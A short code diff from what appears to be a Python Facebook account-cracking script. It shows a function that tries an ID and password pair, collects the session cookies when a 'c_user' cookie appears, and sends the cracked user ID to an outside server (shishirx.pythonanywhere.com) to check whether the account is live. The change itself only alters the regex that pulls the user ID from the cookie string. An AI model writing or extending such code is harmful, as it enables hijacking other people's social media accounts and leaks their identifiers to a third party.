@@ -1244,7 +1244,7 @@ def m6(idf,pwv):
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-    user = re.findall('c_user=(.*?);', coki)
+    user = re.findall('c_user=(.*);', coki)[0]
     url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
     reqx = requests.get(url).text
     if 'live' in reqx:
